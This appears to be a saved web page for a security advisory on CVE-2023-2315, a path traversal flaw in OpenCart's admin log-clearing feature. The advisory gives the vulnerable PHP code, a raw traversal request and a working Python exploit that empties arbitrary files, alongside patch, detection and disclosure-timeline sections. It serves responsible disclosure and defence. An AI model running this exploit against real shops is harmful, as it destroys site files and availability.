@@ -1,0 +1,516 @@
+
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>(CVE-2023-2315) Path Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2 | STAR Labs</title>
+<meta name="keywords" content="">
+<meta name="description" content="Summary:    Product OpenCart     Vendor OpenCart   Severity High - Adversaries may exploit software vulnerabilities to empty any file on the server with write permissions.   Affected Versions 4.0.0.0 - 4.0.2.2   Tested Version(s) 4.0.2.2   CVE Identifier CVE-2023-2315   CVE Description Path traversal in Opencart versions 4.0.0.0 to 4.0.2.2 allows authenticated backend users to empty any existing file on the server with write permissions.">
+<meta name="author" content="Poh Jia Hao (@Chocologicall)">
+<link rel="canonical" href="https://starlabs.sg/advisories/23/23-2315/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
+<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
+<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
+}
+</script>
+<meta property="og:title" content="(CVE-2023-2315) Path Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2" />
+<meta property="og:description" content="Summary:    Product OpenCart     Vendor OpenCart   Severity High - Adversaries may exploit software vulnerabilities to empty any file on the server with write permissions.   Affected Versions 4.0.0.0 - 4.0.2.2   Tested Version(s) 4.0.2.2   CVE Identifier CVE-2023-2315   CVE Description Path traversal in Opencart versions 4.0.0.0 to 4.0.2.2 allows authenticated backend users to empty any existing file on the server with write permissions." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://starlabs.sg/advisories/23/23-2315/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
+<meta property="article:published_time" content="2023-09-18T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2023-09-18T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>
+
+<meta name="twitter:title" content="(CVE-2023-2315) Path Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2"/>
+<meta name="twitter:description" content="Summary:    Product OpenCart     Vendor OpenCart   Severity High - Adversaries may exploit software vulnerabilities to empty any file on the server with write permissions.   Affected Versions 4.0.0.0 - 4.0.2.2   Tested Version(s) 4.0.2.2   CVE Identifier CVE-2023-2315   CVE Description Path traversal in Opencart versions 4.0.0.0 to 4.0.2.2 allows authenticated backend users to empty any existing file on the server with write permissions."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Advisories",
+      "item": "https://starlabs.sg/advisories/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "(CVE-2023-2315) Path Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2",
+      "item": "https://starlabs.sg/advisories/23/23-2315/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "(CVE-2023-2315) Path Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2",
+  "name": "(CVE-2023-2315) Path Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2",
+  "description": "Summary:    Product OpenCart     Vendor OpenCart   Severity High - Adversaries may exploit software vulnerabilities to empty any file on the server with write permissions.   Affected Versions 4.0.0.0 - 4.0.2.2   Tested Version(s) 4.0.2.2   CVE Identifier CVE-2023-2315   CVE Description Path traversal in Opencart versions 4.0.0.0 to 4.0.2.2 allows authenticated backend users to empty any existing file on the server with write permissions.",
+  "keywords": [
+    
+  ],
+  "articleBody": "Summary:    Product OpenCart     Vendor OpenCart   Severity High - Adversaries may exploit software vulnerabilities to empty any file on the server with write permissions.   Affected Versions 4.0.0.0 - 4.0.2.2   Tested Version(s) 4.0.2.2   CVE Identifier CVE-2023-2315   CVE Description Path traversal in Opencart versions 4.0.0.0 to 4.0.2.2 allows authenticated backend users to empty any existing file on the server with write permissions.   CWE Classification(s) CWE-27 - Path Traversal: ‘dir/../../filename’   CAPEC Classification(s) CAPEC-126 - Path Traversal    CVSS3.1 Scoring System: Base Score: 8.1 (High)\nVector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) Low   User Interaction (UI) None   Scope (S) Unchanged   Confidentiality (C) None   Integrity (I) High   Availability (A) High    Product Overview: Opencart is an open source ecommerce platform for online merchants to self-host and list their products for sale. It is structured in a way that allows for a quick setup and Opencart also provides a cloud solution for users who do not want to have an on-premise setup. Opencart is split into two fronts: a storefront containing a catalogue that regular users will access, as well as a backend administrative dashboard for management purposes. Account roles for the backend dashboard are highly customizable, allowing the owner of the website to initialise custom roles with different privileges and access, by using the fine-grained controls.\nVulnerability Summary: There is a path traversal vulnerability at the Logs section of the backend dashboard, which allows an authenticated adversary to empty any existing file on the web server, given that there is write permissions on the file. By default, every OpenCart file is able to be emptied. This means that the availability of the website will be heavily impacted by emptying the core files, preventing regular functionality of the website. This vulnerability was introduced from versions 4.0.0.0 onward and patched in version 4.0.2.3.\nVulnerability Details: A backend user with “access” and “modify” permissions on the “tool/log” setting is able to clear the logs of the website. When clearing the logs in a regular use case, a HTTP GET request is sent to delete the file “error.log”, by specifying it in the filename query parameter. The relevant code that is vulnerable can be found below:\n// /admin/controller/tool/log.php  public function clear(): void { if (isset($this-request-get['filename'])) { $filename = (string)$this-request-get['filename']; // [1]  } else { $filename = ''; } $json = []; if (!$this-user-hasPermission('modify', 'tool/log')) { $json['error'] = $this-language-get('error_permission'); } // DIR_LOGS = /system/storage/logs/  $file = DIR_LOGS . $filename; // [2]  if (!is_file($file)) { $json['error'] = sprintf($this-language-get('error_file'), $filename); } if (!$json) { $handle = fopen($file, 'w+'); // [3]  fclose($handle); $json['success'] = $this-language-get('text_success'); } // ... } At [1], the filename is obtained from the incoming HTTP GET request and stored into the $filename PHP variable without any form of input sanitisation. At [2], the file name is appended to the back of the storage log path /system/storage/logs/ and stored into another variable $file. At [3], the $file variable is used in a fopen() function call with the mode set to w+. This means that the existing file will have its content emptied. Since a file existence check occurs before this, it is not possible to create files that do not already exist.\nIn a normal scenario, the file /system/storage/logs/error.log will be emptied after the GET request is sent. However, since there is a lack of input sanitisation, it is possible for the filename query parameter to contain any number of path traversal sequence (../) to traverse out of the intended directory and point to other files instead. This results in other files being emptied and permanently affecting the website’s functionality.\nExploit Conditions: This vulnerability can be exploited when the attacker has a set of valid credentials to the backend dashboard with access and modify permissions on tool/log.\nProof-of-Concept: We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that exploits the Path Traversal vulnerability.\nThe vulnerability can be exploited by sending a GET request to https://TARGET_HOST/admin/index.php?route=tool/log.clear\u0026user_token=\u0026filename=../../../../../../tmp/PoC.txt, for example:\nGET /admin/index.php?route=tool/log.clear\u0026filename=../../../../../../tmp/PoC.txt\u0026user_token=4d6d604d8862798e96fe91846f28a36f HTTP/1.1 Host: TARGET_HOST Cookie: OCSESSID=4f09deedf4a82f9c5b4bee9ec3; Before running the exploit below, please ensure that you create a non-empty file /tmp/PoC.txt and that it has write permissions for the web user:\n$ echo \"Hello\"  /tmp/PoC.txt $ chmod 777 /tmp/PoC.txt $ ls -la /tmp/PoC.txt -rwxrwxrwx 1 root root 6 Apr 26 09:36 /tmp/PoC.txt Then, run the exploit below:\n# Opencart v4.0.0.0 - v4.0.2.2 path traversal arbitrary file emptying (CVE-2023-2315) # Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.) #!/usr/bin/env python3 import re import requests import sys requests.packages.urllib3.disable_warnings() s = requests.Session() def check_args(): global target, username, password print(\"\\n======= Opencart v4.0.0.0 - v4.0.2.2 path traversal arbitrary file emptying (CVE-2023-2315) =======\") print(\"Please ensure that a file /tmp/PoC.txt with write permissions has been created on the target server with non-empty content!\\n\") if len(sys.argv) != 4: print(\"[!] Please enter the required arguments like so: python3 {}http://TARGET_URL/ADMIN_PATH/ USERNAME PASSWORD\".format(sys.argv[0])) sys.exit(1) target = sys.argv[1].strip(\"/\") username = sys.argv[2] password = sys.argv[3] def authenticate(): global user_token print(\"[+] Attempting to authenticate...\") # Get login_token path = f\"{target}/index.php\" res = s.get(path) login_token = re.findall(\"login_token=(.+)\\\"method\", res.text)[0] # Perform login and get user_token data = { \"username\": username, \"password\": password } path = f\"{target}/index.php?route=common/login.login\u0026login_token={login_token}\" res = s.post(path, data=data) user_token = re.findall(\"user_token=(.+)\\\"\", res.text)[0] if not user_token: print(\"[!] Failed to authenticate! Are the credentials correct?\") sys.exit(1) print(\"[+] Authenticated successfully.\") def delete(): print(\"[+] Attempting to empty /tmp/PoC.txt...\") # Empty /tmp/PoC.txt path = f\"{target}/index.php?route=tool/log.clear\u0026filename=../../../../../../tmp/PoC.txt\u0026user_token={user_token}\" res = s.get(path) print(f\"[+] Output: {res.text}\") def main(): check_args() authenticate() delete() if __name__ == \"__main__\": main() Suggested Mitigations: The patch 0a8dd91 addresses this vulnerability. It is recommended to apply this commit to your installation of OpenCart.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by checking the server’s access logs for all GET requests made to /admin/index.php?route=tool/log.clear, and filtering for requests that contain ../ in the filename query parameter.\nCredits: Poh Jia Hao (@Chocologicall) of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline:  2022-09-06 Followed the security bug reporting instructions and created an OpenCart forum account to try to report to the administrators, but new accounts are unable to send private messages. 2022-09-11 Email sent to support@opencart.com in an attempt to establish a proper communication channel with the project owner/maintainers. 2022-09-12 Support agent replied and suggested to describe the issue in a public channel via their GitHub Issues tracker, to which we reminded that it is a security bug on the latest version. Support agent then requested to send them the report where they will forward it to the developers. We instead requested for the public key of the developers so that the report can be encrypted to prevent information leakage. Support agent replied “they do not have such”. 2022-09-14 Tried the “Contact Us” form on OpenCart’s website. Ended up with a second support ticket being opened. 2022-09-15 Opened a GitHub Issue (#12684) in a last resort to establish a proper communication channel with the developers. Issue closed immediately by the project owner, and marked as spam. 2022-09-15 Email sent directly to webmaster@opencart.com as it is used for GitHub commits. 2022-09-15 Project owner replied and we sent the bug report over. 2022-09-15 Bug fixed in commit 0a8dd91 2023-09-18 Public Release  ",
+  "wordCount" : "1187",
+  "inLanguage": "en",
+  "datePublished": "2023-09-18T00:00:00Z",
+  "dateModified": "2023-09-18T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Poh Jia Hao (@Chocologicall)"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://starlabs.sg/advisories/23/23-2315/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "STAR Labs",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://starlabs.sg/logo-white.png"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
+                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
+                    height="35"> </a>
+            <span class="logo-switches">
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://starlabs.sg/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/advisories/" title="Advisories">
+                    <span>Advisories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/blog/" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/achievements/" title="Achievements">
+                    <span>Achievements</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/publications/" title="Publications">
+                    <span>Publications</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
+    <h1 class="post-title">
+      (CVE-2023-2315) Path Traversal in OpenCart versions 4.0.0.0 to 4.0.2.2
+    </h1>
+    <div class="post-meta"><span title='2023-09-18 00:00:00 +0000 UTC'>September 18, 2023</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Poh Jia Hao (@Chocologicall)
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
+                <li>
+                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
+                <li>
+                    <a href="#product-overview" aria-label="Product Overview:">Product Overview:</a></li>
+                <li>
+                    <a href="#vulnerability-summary" aria-label="Vulnerability Summary:">Vulnerability Summary:</a></li>
+                <li>
+                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
+                <li>
+                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
+                <li>
+                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
+                <li>
+                    <a href="#suggested-mitigations" aria-label="Suggested Mitigations:">Suggested Mitigations:</a></li>
+                <li>
+                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li>
+                <li>
+                    <a href="#credits" aria-label="Credits:">Credits:</a></li>
+                <li>
+                    <a href="#timeline" aria-label="Timeline:">Timeline:</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
+<table>
+<thead>
+<tr>
+<th><strong>Product</strong></th>
+<th>OpenCart</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Vendor</strong></td>
+<td>OpenCart</td>
+</tr>
+<tr>
+<td><strong>Severity</strong></td>
+<td>High - Adversaries may exploit software vulnerabilities to empty any file on the server with write permissions.</td>
+</tr>
+<tr>
+<td><strong>Affected Versions</strong></td>
+<td>4.0.0.0 - 4.0.2.2</td>
+</tr>
+<tr>
+<td><strong>Tested Version(s)</strong></td>
+<td>4.0.2.2</td>
+</tr>
+<tr>
+<td><strong>CVE Identifier</strong></td>
+<td>CVE-2023-2315</td>
+</tr>
+<tr>
+<td><strong>CVE Description</strong></td>
+<td>Path traversal in Opencart versions 4.0.0.0 to 4.0.2.2 allows authenticated backend users to empty any existing file on the server with write permissions.</td>
+</tr>
+<tr>
+<td><strong>CWE Classification(s)</strong></td>
+<td>CWE-27 - Path Traversal: &lsquo;dir/../../filename&rsquo;</td>
+</tr>
+<tr>
+<td><strong>CAPEC Classification(s)</strong></td>
+<td>CAPEC-126 - Path Traversal</td>
+</tr>
+</tbody>
+</table>
+<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
+<p><strong>Base Score:</strong> 8.1 (High)<br>
+<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H</code></p>
+<table>
+<thead>
+<tr>
+<th><strong>Metric</strong></th>
+<th><strong>Value</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Attack Vector (AV)</strong></td>
+<td>Network</td>
+</tr>
+<tr>
+<td><strong>Attack Complexity (AC)</strong></td>
+<td>Low</td>
+</tr>
+<tr>
+<td><strong>Privileges Required (PR)</strong></td>
+<td>Low</td>
+</tr>
+<tr>
+<td><strong>User Interaction (UI)</strong></td>
+<td>None</td>
+</tr>
+<tr>
+<td><strong>Scope (S)</strong></td>
+<td>Unchanged</td>
+</tr>
+<tr>
+<td><strong>Confidentiality (C)</strong></td>
+<td>None</td>
+</tr>
+<tr>
+<td><strong>Integrity (I)</strong></td>
+<td>High</td>
+</tr>
+<tr>
+<td><strong>Availability (A)</strong></td>
+<td>High</td>
+</tr>
+</tbody>
+</table>
+<h2 id="product-overview">Product Overview:<a hidden class="anchor" aria-hidden="true" href="#product-overview">#</a></h2>
+<p>Opencart is an open source ecommerce platform for online merchants to self-host and list their products for sale. It is structured in a way that allows for a quick setup and Opencart also provides a cloud solution for users who do not want to have an on-premise setup. Opencart is split into two fronts: a storefront containing a catalogue that regular users will access, as well as a backend administrative dashboard for management purposes. Account roles for the backend dashboard are highly customizable, allowing the owner of the website to initialise custom roles with different privileges and access, by using the fine-grained controls.</p>
+<h2 id="vulnerability-summary">Vulnerability Summary:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-summary">#</a></h2>
+<p>There is a path traversal vulnerability at the Logs section of the backend dashboard, which allows an authenticated adversary to empty any existing file on the web server, given that there is write permissions on the file. By default, every OpenCart file is able to be emptied. This means that the availability of the website will be heavily impacted by emptying the core files, preventing regular functionality of the website. This vulnerability was introduced from <a href="https://github.com/opencart/opencart/commit/23b9d53e4c903e1a33278c199b2013f2267881cb#diff-102e09e795272ef9414f0d1affbe6e193b95d5d0bd33b9f776515b1d112e428f">versions 4.0.0.0 onward</a> and patched in <a href="https://github.com/opencart/opencart/commit/0a8dd91e385f70e42795380009fd644224c1bc97">version 4.0.2.3</a>.</p>
+<h2 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
+<p>A backend user with &ldquo;access&rdquo; and &ldquo;modify&rdquo; permissions on the &ldquo;tool/log&rdquo; setting is able to clear the logs of the website. When clearing the logs in a regular use case, a HTTP GET request is sent to delete the file &ldquo;error.log&rdquo;, by specifying it in the <code>filename</code> query parameter. The relevant code that is vulnerable can be found below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// /admin/controller/tool/log.php
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="nf">clear</span><span class="p">()</span><span class="o">:</span> <span class="nx">void</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">request</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">request</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span> <span class="c1">// [1]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$filename</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nv">$json</span> <span class="o">=</span> <span class="p">[];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user</span><span class="o">-&gt;</span><span class="na">hasPermission</span><span class="p">(</span><span class="s1">&#39;modify&#39;</span><span class="p">,</span> <span class="s1">&#39;tool/log&#39;</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$json</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">language</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;error_permission&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// DIR_LOGS = /system/storage/logs/
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">DIR_LOGS</span> <span class="o">.</span> <span class="nv">$filename</span><span class="p">;</span> <span class="c1">// [2]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$json</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">language</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;error_file&#39;</span><span class="p">),</span> <span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$json</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$handle</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;w+&#39;</span><span class="p">);</span> <span class="c1">// [3]
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$json</span><span class="p">[</span><span class="s1">&#39;success&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">language</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;text_success&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// ...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><p>At <code>[1]</code>, the filename is obtained from the incoming HTTP GET request and stored into the <code>$filename</code> PHP variable without any form of input sanitisation. At <code>[2]</code>, the file name is appended to the back of the storage log path <code>/system/storage/logs/</code> and stored into another variable <code>$file</code>. At <code>[3]</code>, the <code>$file</code> variable is used in a <code>fopen()</code> function call with the mode set to <code>w+</code>. This means that the existing file will have its content emptied. Since a file existence check occurs before this, it is not possible to create files that do not already exist.</p>
+<p>In a normal scenario, the file <code>/system/storage/logs/error.log</code> will be emptied after the GET request is sent. However, since there is a lack of input sanitisation, it is possible for the <code>filename</code> query parameter to contain any number of path traversal sequence (<code>../</code>) to traverse out of the intended directory and point to other files instead. This results in other files being emptied and permanently affecting the website&rsquo;s functionality.</p>
+<h2 id="exploit-conditions">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions">#</a></h2>
+<p>This vulnerability can be exploited when the attacker has a set of valid credentials to the backend dashboard with <code>access</code> and <code>modify</code> permissions on <code>tool/log</code>.</p>
+<h2 id="proof-of-concept">Proof-of-Concept:<a hidden class="anchor" aria-hidden="true" href="#proof-of-concept">#</a></h2>
+<p>We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that exploits the Path Traversal vulnerability.</p>
+<p>The vulnerability can be exploited by sending a GET request to <code>https://TARGET_HOST/admin/index.php?route=tool/log.clear&amp;user_token=&lt;USER_TOKEN&gt;&amp;filename=../../../../../../tmp/PoC.txt</code>, for example:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/admin/index.php?route=tool/log.clear&amp;filename=../../../../../../tmp/PoC.txt&amp;user_token=4d6d604d8862798e96fe91846f28a36f</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">TARGET_HOST</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">OCSESSID=4f09deedf4a82f9c5b4bee9ec3;</span>
+</span></span></code></pre></div><p>Before running the exploit below, please ensure that you create a non-empty file <code>/tmp/PoC.txt</code> and that it has write permissions for the web user:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;Hello&#34;</span> &gt; /tmp/PoC.txt
+</span></span><span class="line"><span class="cl">$ chmod <span class="m">777</span> /tmp/PoC.txt 
+</span></span><span class="line"><span class="cl">$ ls -la /tmp/PoC.txt
+</span></span><span class="line"><span class="cl">-rwxrwxrwx <span class="m">1</span> root root <span class="m">6</span> Apr <span class="m">26</span> 09:36 /tmp/PoC.txt
+</span></span></code></pre></div><p>Then, run the exploit below:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Opencart v4.0.0.0 - v4.0.2.2 path traversal arbitrary file emptying (CVE-2023-2315)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author: Poh Jia Hao (STAR Labs SG Pte. Ltd.)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="n">requests</span><span class="o">.</span><span class="n">packages</span><span class="o">.</span><span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_args</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="n">target</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">password</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">======= Opencart v4.0.0.0 - v4.0.2.2 path traversal arbitrary file emptying (CVE-2023-2315) =======&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Please ensure that a file /tmp/PoC.txt with write permissions has been created on the target server with non-empty content!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Please enter the required arguments like so: python3 </span><span class="si">{}</span><span class="s2"> http://TARGET_URL/ADMIN_PATH/ USERNAME PASSWORD&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
